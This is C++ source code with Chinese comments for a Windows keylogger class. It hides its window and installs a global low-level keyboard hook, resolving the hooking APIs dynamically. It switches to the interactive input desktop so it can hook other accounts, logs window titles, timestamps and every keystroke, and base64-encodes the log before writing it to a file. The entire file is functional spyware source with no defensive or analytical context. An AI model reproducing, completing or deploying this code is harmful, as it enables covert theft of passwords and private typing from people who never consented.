// KbHook.cpp : Defines the entry point for the console application.
//
#include "pch.h"
#include "windows.h"
#include "stdio.h"
#include "kbhook.h"
#include <malloc.h>




#define _WIN32_WINNT  0x0500    //仅NT5.0以上系统可用

#define WM_StartHook WM_USER+100
#define WM_StopHook  WM_USER+200

#define WM_MYQUIT  WM_USER+300

typedef LRESULT(WINAPI *My_DefWindowProc)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
My_DefWindowProc myDefWindowProc;

typedef HHOOK(WINAPI *My_SetWindowsHookEx)(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId);
My_SetWindowsHookEx mySetWindowsHookEx;
//---------------------------------------------------------------------------------

_KbHook* _KbHook::m_pThis = NULL;

_KbHook::_KbHook()
{
	m_pThis = this;

	m_hWndKeylogger = NULL;
	m_hhook = NULL;
	m_hLastFocus = NULL;

	m_bSend = false;
	m_bOfflineLog = false;
	m_bLogToFile = false;

	memset(m_CurrentWindowText, 0, sizeof(m_CurrentWindowText));
	memset(m_LastWindowText, 0, sizeof(m_LastWindowText));

	memset(m_fileName, 0, MAX_PATH);
	m_hFile = INVALID_HANDLE_VALUE;

	m_hCreateWindowEvent = CreateEvent(NULL, false, false, NULL);

	m_ThreadHandle = CreateThread(NULL, NULL, CreateWindowThread, this, NULL, &m_ThreadID);

	WaitForSingleObject(m_hCreateWindowEvent, 10000);//10秒应该够长了吧
}
//---------------------------------------------------------------------------------
_KbHook::~_KbHook()
{

	SendMessage(m_hWndKeylogger, WM_QUIT, 0, 0);
	if (m_ThreadHandle != NULL)
	{
		try
		{
			TerminateThread(m_ThreadHandle, 0);
			m_ThreadHandle = NULL;
		}
		catch (...)
		{
			return;
		}
	}
}

//创建窗口
DWORD __stdcall _KbHook::CreateWindowThread(LPVOID lpParam)
{
	_KbHook* pKbHook = (_KbHook*)lpParam;
	pKbHook->CreateWindowHook();
	return 0;
}
void _KbHook::CreateWindowHook()
{
	try
	{
		Desktop_Capture("WinSta0", NULL, NULL, 0);
		WNDCLASSEX	wndClassEx;		//ebp-6c
									//char		szBuffer[0x20];	//ebp-3c
		MSG			msg;			//ebp-1c

		HMODULE hModule = GetModuleHandle(NULL);//句柄，相当于 HINSTANCE

		if (hModule != 0)
		{
			//创建窗口 设定视窗类别
			wndClassEx.cbSize = 0x30;
			wndClassEx.style = 0;
			wndClassEx.lpfnWndProc = HookWindowProc;
			wndClassEx.cbClsExtra = 0;
			wndClassEx.cbWndExtra = 0;
			wndClassEx.hInstance = hModule;
			wndClassEx.hIcon = 0;
			wndClassEx.hCursor = NULL;
			wndClassEx.hbrBackground = NULL;
			wndClassEx.lpszMenuName = NULL;
			wndClassEx.lpszClassName = "KB";
			wndClassEx.hIconSm = 0;

			// 注册新视窗类别
			RegisterClassEx(&wndClassEx);
			// 建构视窗
			m_hWndKeylogger = CreateWindowEx(0, wndClassEx.lpszClassName, NULL, WS_OVERLAPPED,
				0, 0, 0, 0, NULL, NULL, hModule, NULL);
			ShowWindow(m_hWndKeylogger, SW_HIDE);
			UpdateWindow(m_hWndKeylogger);
			SetEvent(m_hCreateWindowEvent);

			// 等待 WM_QUIT 消息循环
			try
			{
				while (GetMessage(&msg, NULL, 0, 0))
				{
					TranslateMessage(&msg);
					DispatchMessage(&msg);
				}
			}
			catch (...)
			{
			}
			if (m_hhook != NULL)
			{
				UnhookWindowsHookEx(m_hhook);
				m_hhook = NULL;
			}
		}
	}
	catch (...)
	{
	}
}

LRESULT CALLBACK _KbHook::HookWindowProc(HWND hWndKeylogger, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	HINSTANCE h = LoadLibrary("User32.dll");
	myDefWindowProc = (My_DefWindowProc)GetProcAddress(h, "DefWindowProcA");
	switch (Msg)
	{
	case WM_StartHook:
		m_pThis->StartHook();
		return 0;
	case WM_StopHook:
		m_pThis->StopHook();
		return 0;
	case WM_QUIT:
		PostQuitMessage(0);
		return 0;
	default: break;
	}
	return myDefWindowProc(hWndKeylogger, Msg, wParam, lParam);
}

void _KbHook::SendStartHook(char* fileName, int len)
{
	if (m_hWndKeylogger == NULL)
		return;
	if (m_hhook)
		return;

	memcpy(m_fileName, fileName, len);
	SendMessage(m_hWndKeylogger, WM_StartHook, 0, 0);
}
//---------------------------------------------------------------------------------
void _KbHook::SendStopHook()
{
	SendMessage(m_hWndKeylogger, WM_StopHook, 0, 0);
}
//---------------------------------------------------------------------------------
void _KbHook::StartHook()
{
	if (m_hFile == INVALID_HANDLE_VALUE)
	{
		m_hFile = CreateFile(m_fileName, GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		SetFilePointer(m_hFile, 0, 0, FILE_END);
	}

	HINSTANCE h = LoadLibrary("User32.dll");
	mySetWindowsHookEx = (My_SetWindowsHookEx)GetProcAddress(h, "SetWindowsHookExA");
	m_hhook = mySetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
}
//---------------------------------------------------------------------------------
void _KbHook::StopHook()
{
	if (m_hhook != NULL)
	{
		UnhookWindowsHookEx(m_hhook);
		m_hhook = NULL;

		if (INVALID_HANDLE_VALUE != m_hFile)
		{
			CloseHandle(m_hFile);
			m_hFile = INVALID_HANDLE_VALUE;
		}
	}
}

LRESULT CALLBACK _KbHook::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (m_pThis != NULL)
	{
		return m_pThis->KeyboardHookFunc(nCode, wParam, lParam);
	}
	return 0L;
}

LRESULT _KbHook::KeyboardHookFunc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode != HC_ACTION)
		return CallNextHookEx(m_hhook, nCode, wParam, lParam);

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

	if (wParam == WM_KEYDOWN)
	{
		if ((int)(GetTickCount() - p->time) > 100 || (int)(GetTickCount() - p->time) < -100)
		{
			return CallNextHookEx(m_hhook, nCode, wParam, lParam);
		}

		HWND hFocus; //保存当前活动窗口句柄
		hFocus = GetForegroundWindow();//获得活动窗口的句柄
		memset(m_CurrentWindowText, 0, 128);
		GetWindowText(hFocus, m_CurrentWindowText, 128);
		if (m_hLastFocus != hFocus || strcmp(m_LastWindowText, m_CurrentWindowText) != 0)
		{
			char szSendBuffer[512]; //当前窗口名称
			SYSTEMTIME st;
			GetLocalTime(&st);
			wsprintf(szSendBuffer, "\r\n%d-%d-%d %d:%d\'%d\"  ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
			memset(m_LastWindowText, 0, 128);
			GetWindowText(hFocus, m_LastWindowText, 128);
			strcat(szSendBuffer, m_LastWindowText);
			strcat(szSendBuffer, "\r\n");
			m_hLastFocus = hFocus;
			ProcessKeyInfo(szSendBuffer);
		}

		char KeyBuffer[32];
		memset(KeyBuffer, 0, 32);

		int iShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0 ? 1 : 0;
		int iCapital = GetKeyState(VK_CAPITAL) & 0x0001;

		switch (p->vkCode) {
		case VK_BACK:       ProcessKeyInfo("(BK)");       break;
		case VK_TAB:       ProcessKeyInfo("(TAB)");       break;
		case VK_CLEAR:       ProcessKeyInfo("(CLEAR)");       break;
		case VK_RETURN:       ProcessKeyInfo("↙");       break;
		case VK_SHIFT:       ProcessKeyInfo("(SHIFT DOWN)");       break;
		case VK_CONTROL:       ProcessKeyInfo("(CTRL DOWN)");       break;
		case VK_MENU:       ProcessKeyInfo("(ALT DOWN)");       break;
		case VK_PAUSE:       ProcessKeyInfo("(PAUSE)");       break;
		case VK_CAPITAL:       ProcessKeyInfo("(CAPS LOCK)");       break;
		case VK_ESCAPE:       ProcessKeyInfo("(ESC)");       break;
		case VK_SPACE:       ProcessKeyInfo(" ");       break;
		case VK_PRIOR:       ProcessKeyInfo("(PAGE UP)");       break;
		case VK_NEXT:       ProcessKeyInfo("(PAGE DOWN)");       break;
		case VK_END:       ProcessKeyInfo("(END)");       break;
		case VK_HOME:       ProcessKeyInfo("(HOME)");       break;
		case VK_LEFT:       ProcessKeyInfo("←");       break;
		case VK_UP:       ProcessKeyInfo("↑");       break;
		case VK_RIGHT:       ProcessKeyInfo("→");       break;
		case VK_DOWN:       ProcessKeyInfo("↓");       break;
		case VK_SELECT:       ProcessKeyInfo("(SELECT)");       break;
		case VK_PRINT:       ProcessKeyInfo("(PRINT)");       break;
		case VK_EXECUTE:       ProcessKeyInfo("(EXECUTE)");       break;
		case VK_SNAPSHOT:       ProcessKeyInfo("(PRINT SCREEN)");       break;
		case VK_INSERT:       ProcessKeyInfo("(INSERT)");       break;
		case VK_DELETE:       ProcessKeyInfo("(DEL)");       break;
		case VK_HELP:       ProcessKeyInfo("(HELP)");       break;
		case VK_LWIN:       ProcessKeyInfo("(Left Windows key DOWN)");       break;
		case VK_RWIN:       ProcessKeyInfo("(Right Windows key DOWN)");       break;
		case VK_APPS:       ProcessKeyInfo("(Applications key)");       break;
		case VK_SLEEP:       ProcessKeyInfo("(Computer Sleep key)");       break;
		case VK_NUMPAD0:
			strcpy(KeyBuffer, "0");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_NUMPAD1:
			strcpy(KeyBuffer, "1");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_NUMPAD2:
			strcpy(KeyBuffer, "2");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_NUMPAD3:
			strcpy(KeyBuffer, "3");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_NUMPAD4:
			strcpy(KeyBuffer, "4");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_NUMPAD5:
			strcpy(KeyBuffer, "5");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_NUMPAD6:
			strcpy(KeyBuffer, "6");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_NUMPAD7:
			strcpy(KeyBuffer, "7");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_NUMPAD8:
			strcpy(KeyBuffer, "8");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_NUMPAD9:
			strcpy(KeyBuffer, "9");
			ProcessKeyInfo(KeyBuffer);
			break;
		case VK_MULTIPLY:
			if (iShift)
				ProcessKeyInfo(":");
			else
				ProcessKeyInfo("*");
			break;
		case VK_ADD:       ProcessKeyInfo("+");       break;
		case VK_SEPARATOR:       ProcessKeyInfo("(Separator key)");       break;
		case VK_SUBTRACT:       ProcessKeyInfo("-");       break;
		case VK_DECIMAL:       ProcessKeyInfo(".");       break;
		case VK_DIVIDE:       ProcessKeyInfo("/");       break;
		case VK_F1:       ProcessKeyInfo("(F1)");       break;
		case VK_F2:       ProcessKeyInfo("(F2)");       break;
		case VK_F3:       ProcessKeyInfo("(F3)");       break;
		case VK_F4:       ProcessKeyInfo("(F4)");       break;
		case VK_F5:       ProcessKeyInfo("(F5)");       break;
		case VK_F6:       ProcessKeyInfo("(F6)");       break;
		case VK_F7:       ProcessKeyInfo("(F7)");       break;
		case VK_F8:       ProcessKeyInfo("(F8)");       break;
		case VK_F9:       ProcessKeyInfo("(F9)");       break;
		case VK_F10:       ProcessKeyInfo("(F10)");       break;
		case VK_F11:       ProcessKeyInfo("(F11)");       break;
		case VK_F12:       ProcessKeyInfo("(F12)");       break;
		case VK_NUMLOCK:       ProcessKeyInfo("(NUM LOCK)");       break;
		case VK_SCROLL:       ProcessKeyInfo("(SCROLL LOCK)");       break;
		case VK_LSHIFT:       ProcessKeyInfo("(SHIFT DOWN)");       break;
		case VK_RSHIFT:       ProcessKeyInfo("(SHIFT DOWN)");       break;
		case VK_LCONTROL:       ProcessKeyInfo("(CTRL DOWN)");       break;
		case VK_RCONTROL:       ProcessKeyInfo("(CTRL DOWN)");       break;
		case VK_LMENU:       ProcessKeyInfo("(Left MENU)");       break;
		case VK_RMENU:       ProcessKeyInfo("(Right MENU)");       break;
		case VK_BROWSER_BACK:       ProcessKeyInfo("(Browser Back key)");       break;
		case VK_BROWSER_FORWARD:       ProcessKeyInfo("(Browser Forward key)");       break;
		case VK_BROWSER_REFRESH:       ProcessKeyInfo("(Browser Refresh key)");       break;
		case VK_BROWSER_STOP:       ProcessKeyInfo("(Browser Stop key)");       break;
		case VK_BROWSER_SEARCH:       ProcessKeyInfo("(Browser Search key )");       break;
		case VK_BROWSER_FAVORITES:       ProcessKeyInfo("(Browser Favorites key)");       break;
		case VK_BROWSER_HOME:       ProcessKeyInfo("(Browser Start and Home key)");       break;
		case VK_VOLUME_MUTE:       ProcessKeyInfo("(Volume Mute key)");       break;
		case VK_VOLUME_DOWN:       ProcessKeyInfo("(Volume Down key)");       break;
		case VK_VOLUME_UP:       ProcessKeyInfo("(Volume Up key)");       break;
		case VK_MEDIA_NEXT_TRACK:       ProcessKeyInfo("(Next Track key)");       break;
		case VK_MEDIA_PREV_TRACK:       ProcessKeyInfo("(Previous Track key)");       break;
		case VK_MEDIA_STOP:       ProcessKeyInfo("(Stop Media key)");       break;
		case VK_MEDIA_PLAY_PAUSE:       ProcessKeyInfo("(Play/Pause Media key)");       break;
		case VK_LAUNCH_MAIL:       ProcessKeyInfo("(Start Mail key)");       break;
		case VK_LAUNCH_MEDIA_SELECT:       ProcessKeyInfo("(Select Media key)");       break;
		case VK_LAUNCH_APP1:       ProcessKeyInfo("(Start Application 1 key)");       break;
		case VK_LAUNCH_APP2:       ProcessKeyInfo("(Start Application 2 key)");       break;
		case VK_OEM_1:
			if (iShift)
				ProcessKeyInfo(":");
			else
				ProcessKeyInfo(";");
			break;
		case VK_OEM_PLUS:
			if (iShift)
				ProcessKeyInfo("+");
			else
				ProcessKeyInfo("=");
			break;
		case VK_OEM_COMMA:
			if (iShift)
				ProcessKeyInfo("<");
			else
				ProcessKeyInfo(",");
			break;
		case VK_OEM_MINUS:
			if (iShift)
				ProcessKeyInfo("_");
			else
				ProcessKeyInfo("-");
			break;
		case VK_OEM_PERIOD:
			if (iShift)
				ProcessKeyInfo(">");
			else
				ProcessKeyInfo(".");
			break;
		case VK_OEM_2:
			if (iShift)
				ProcessKeyInfo("?");
			else
				ProcessKeyInfo("/");
			break;
		case VK_OEM_3:
			if (iShift)
				ProcessKeyInfo("~");
			else
				ProcessKeyInfo("`");
			break;
		case VK_OEM_4:
			if (iShift)
				ProcessKeyInfo("{");
			else
				ProcessKeyInfo("[");
			break;
		case VK_OEM_5:
			if (iShift)
				ProcessKeyInfo("|");
			else
				ProcessKeyInfo("\\");
			break;
		case VK_OEM_6:
			if (iShift)
				ProcessKeyInfo("}");
			else
				ProcessKeyInfo("]");
			break;
		case VK_OEM_7:
			if (iShift)
				ProcessKeyInfo("\"");
			else
				ProcessKeyInfo("\'");
			break;
		case VK_OEM_CLEAR:       ProcessKeyInfo("(Clear)");       break;
		default:
		{
			//if('z'p->vkCode<'z')
			char Key = (char)tolower(p->vkCode);
			if (Key <= 'z'&&Key >= 'a')
			{
				if (iCapital^iShift)
					Key = Key - 'a' + 'A';
			}
			else if (Key == '0')
			{
				if (iShift)
					Key = ')';
			}
			else if (Key == '1')
			{
				if (iShift)
					Key = '!';
			}
			else if (Key == '2')
			{
				if (iShift)
					Key = '@';
			}
			else if (Key == '3')
			{
				if (iShift)
					Key = '#';
			}
			else if (Key == '4')
			{
				if (iShift)
					Key = '$';
			}
			else if (Key == '5')
			{
				if (iShift)
					Key = '%';
			}
			else if (Key == '6')
			{
				if (iShift)
					Key = '^';
			}
			else if (Key == '7')
			{
				if (iShift)
					Key = '&';
			}
			else if (Key == '8')
			{
				if (iShift)
					Key = '*';
			}
			else if (Key == '9')
			{
				if (iShift)
					Key = '(';
			}
			char Buffer[2];
			Buffer[0] = Key;
			Buffer[1] = 0;
			ProcessKeyInfo(Buffer);
		}
		}
	}
	if (wParam == WM_KEYUP) {

		switch (p->vkCode) {
		case VK_SHIFT:       ProcessKeyInfo("(SHIFT UP)");       break;
		case VK_CONTROL:       ProcessKeyInfo("(CTRL UP)");       break;
		case VK_MENU:       ProcessKeyInfo("(ALT UP)");       break;
		case VK_LSHIFT:       ProcessKeyInfo("(SHIFT UP)");       break;
		case VK_RSHIFT:       ProcessKeyInfo("(SHIFT UP)");       break;
		case VK_LCONTROL:       ProcessKeyInfo("(CTRL UP)");       break;
		case VK_RCONTROL:       ProcessKeyInfo("(CTRL UP)");       break;
		case VK_LWIN:       ProcessKeyInfo("(Windows key UP)");       break;
		case VK_RWIN:       ProcessKeyInfo("(Windows key UP)");       break;
		default: break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
// 全局常量定义
const char * base64char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
const char padding_char = '=';

/*编码代码
* const unsigned char * sourcedata， 源数组
* char * base64 ，码字保存
*/
int base64_encode(const unsigned char * sourcedata, char * base64)
{
	int i = 0, j = 0;
	unsigned char trans_index = 0;    // 索引是8位，但是高两位都为0
	const int datalength = strlen((const char*)sourcedata);
	for (; i < datalength; i += 3) {
		// 每三个一组，进行编码
		// 要编码的数字的第一个
		trans_index = ((sourcedata[i] >> 2) & 0x3f);
		base64[j++] = base64char[(int)trans_index];
		// 第二个
		trans_index = ((sourcedata[i] << 4) & 0x30);
		if (i + 1 < datalength) {
			trans_index |= ((sourcedata[i + 1] >> 4) & 0x0f);
			base64[j++] = base64char[(int)trans_index];
		}
		else {
			base64[j++] = base64char[(int)trans_index];

			base64[j++] = padding_char;

			base64[j++] = padding_char;

			break;   // 超出总长度，可以直接break
		}
		// 第三个
		trans_index = ((sourcedata[i + 1] << 2) & 0x3c);
		if (i + 2 < datalength) { // 有的话需要编码2个
			trans_index |= ((sourcedata[i + 2] >> 6) & 0x03);
			base64[j++] = base64char[(int)trans_index];

			trans_index = sourcedata[i + 2] & 0x3f;
			base64[j++] = base64char[(int)trans_index];
		}
		else {
			base64[j++] = base64char[(int)trans_index];

			base64[j++] = padding_char;

			break;
		}
	}

	base64[j] = '\0';

	return 0;
}

/** 在字符串中查询特定字符位置索引
* const char *str ，字符串
* char c，要查找的字符
*/
inline int num_strchr(const char *str, char c) // 
{
	const char *pindex = strchr(str, c);
	if (NULL == pindex) {
		return -1;
	}
	return pindex - str;
}
/* 解码
* const char * base64 码字
* unsigned char * dedata， 解码恢复的数据
*/
int base64_decode(const char * base64, unsigned char * dedata)
{
	int i = 0, j = 0;
	int trans[4] = { 0,0,0,0 };
	for (; base64[i] != '\0'; i += 4) {
		// 每四个一组，译码成三个字符
		trans[0] = num_strchr(base64char, base64[i]);
		trans[1] = num_strchr(base64char, base64[i + 1]);
		// 1/3
		dedata[j++] = ((trans[0] << 2) & 0xfc) | ((trans[1] >> 4) & 0x03);

		if (base64[i + 2] == '=') {
			continue;
		}
		else {
			trans[2] = num_strchr(base64char, base64[i + 2]);
		}
		// 2/3
		dedata[j++] = ((trans[1] << 4) & 0xf0) | ((trans[2] >> 2) & 0x0f);

		if (base64[i + 3] == '=') {
			continue;
		}
		else {
			trans[3] = num_strchr(base64char, base64[i + 3]);
		}

		// 3/3
		dedata[j++] = ((trans[2] << 6) & 0xc0) | (trans[3] & 0x3f);
	}

	dedata[j] = '\0';

	return 0;
}
LPCSTR AnsiToUtf8(LPCSTR Ansi)
{
   int WLength = MultiByteToWideChar(CP_ACP, 0, Ansi, -1, NULL, 0);
   LPWSTR pszW = (LPWSTR)_alloca((WLength + 1) * sizeof(WCHAR));
   MultiByteToWideChar(CP_ACP, 0, Ansi, -1, pszW, WLength);

   int ALength = WideCharToMultiByte(CP_UTF8, 0, pszW, -1, NULL, 0, NULL, NULL);
   LPSTR pszA = (LPSTR)_alloca(ALength + 1);
   WideCharToMultiByte(CP_UTF8, 0, pszW, -1, pszA, ALength, NULL, NULL);
   pszA[ALength] = 0;

  return pszA;
}


void _KbHook::ProcessKeyInfo(char *Buffer)
{
	
	LPCSTR str;
	str = AnsiToUtf8(Buffer);

	unsigned  char str_l[MAX_PATH] = { 0 };
	 memcpy(str_l, str, strlen(str));
	const unsigned char *sourcedata = str_l;
	char base64[MAX_PATH] = {0};
	base64_encode(sourcedata, base64);
	
//	char dedata[128];
//	base64_decode(base64, (unsigned char*)dedata);  //解密

	DWORD dwLen = 0;
	int iRet = WriteFile(m_hFile, base64, strlen(base64), &dwLen, NULL);
	if (iRet == 0)
	{
	}
	WriteFile(m_hFile, "\r\n", 1, &dwLen, NULL);
}

//------------------------------------------------------------------
//捕捉指定屏幕,切换到输入桌面
BOOL _KbHook::Desktop_Capture(PCHAR lpWinSta, PCHAR lpDesktop, PCHAR lpFile, DWORD m_dwLastError)
{
	try {
		HWINSTA hWinSta = OpenWindowStation(lpWinSta, false, MAXIMUM_ALLOWED);
		if (hWinSta == NULL)
		{
			m_dwLastError = GetLastError();
			return FALSE;
		}

		HWINSTA hOldWinSta = GetProcessWindowStation();
		if (!SetProcessWindowStation(hWinSta))
		{
			m_dwLastError = GetLastError();
			CloseWindowStation(hWinSta);
			return FALSE;
		}
		HDESK hDesktop = OpenInputDesktop(DF_ALLOWOTHERACCOUNTHOOK, FALSE, MAXIMUM_ALLOWED);
		if (hDesktop == NULL)
		{
			m_dwLastError = GetLastError();
			SetProcessWindowStation(hOldWinSta);
			CloseWindowStation(hWinSta);
			return FALSE;
		}

		HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
		if (!SetThreadDesktop(hDesktop))
		{
			m_dwLastError = GetLastError();
			SetProcessWindowStation(hOldWinSta);
			CloseWindowStation(hWinSta);
			return FALSE;
		}

		CloseWindowStation(hWinSta);
		CloseDesktop(hDesktop);
	}
	catch (...)
	{
	}
	return true; //bCapture;
}